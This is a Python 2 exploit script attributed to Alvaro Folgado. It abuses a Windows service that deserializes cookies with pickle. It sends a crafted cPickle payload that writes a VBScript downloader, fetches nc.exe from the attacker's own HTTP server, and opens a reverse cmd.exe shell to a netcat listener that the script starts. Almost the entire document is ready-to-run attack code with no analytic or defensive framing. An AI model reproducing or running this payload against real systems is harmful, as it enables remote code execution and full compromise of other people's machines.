
########################################################################
#Alvaro Folgado
########################################################################


#!/usr/bin/env python
#In this one we create a vbs script in the target windows machine to download the nc.exe and open a revshell
import cPickle
import socket
import subprocess
import base64
import sys
import os
import time


if len(sys.argv) != 6:
	print 'exploitlinux.py <TargetIp> <TargetPort> <HandlerIp> <HandlerPort> <ServingServerPort>'
	sys.exit()


payload="cos"
payload+="\nsystem"
payload+="\np1"
payload+="\n(S'echo strUrl = WScript.Arguments.Item(0) > wget.vbs && echo StrFile = WScript.Arguments.Item(1) >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs && echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs && echo Err.Clear >> wget.vbs && echo Set http = Nothing >> wget.vbs && echo Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") >> wget.vbs && echo http.Open \"GET\", strURL, False >> wget.vbs && echo http.Send >> wget.vbs && echo varByteArray = http.ResponseBody >> wget.vbs && echo Set http = Nothing >> wget.vbs && echo Set fs = CreateObject(\"Scripting.FileSystemObject\") >> wget.vbs && echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs && echo strData = \"\" >> wget.vbs && echo strBuffer = \"\" >> wget.vbs && echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs && echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs && echo Next >> wget.vbs && echo ts.Close >> wget.vbs && wget.vbs http://"+sys.argv[3]+":"+sys.argv[5]+"/nc.exe nc.exe && ping 127.0.0.1 -n 6 > nul && nc.exe -nv "+sys.argv[3]+" "+sys.argv[4]+"+ -e cmd.exe'"
payload+="\np2"
payload+="\ntp3"
payload+="\nRp4"

payloadencoded = base64.b64encode(payload)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

connect = s.connect((sys.argv[1],int(sys.argv[2])))

proc1 = subprocess.Popen(['python','-c','import SimpleHTTPServer\nimport SocketServer\nPORT = '+sys.argv[5]+'\nHandler = SimpleHTTPServer.SimpleHTTPRequestHandler\nhttpd = SocketServer.TCPServer(("", PORT), Handler)\nhttpd.serve_forever()'])


s.send('GET / HTTP/1.1\r\nCookie:session='+payloadencoded+';\r\nContent-Length: 2\r\n\r\n')

time.sleep(3)

proc1.kill()
print "Shell or not to Shell"

os.system('nc -nlvp '+sys.argv[4]+'')

s.recv(1024)



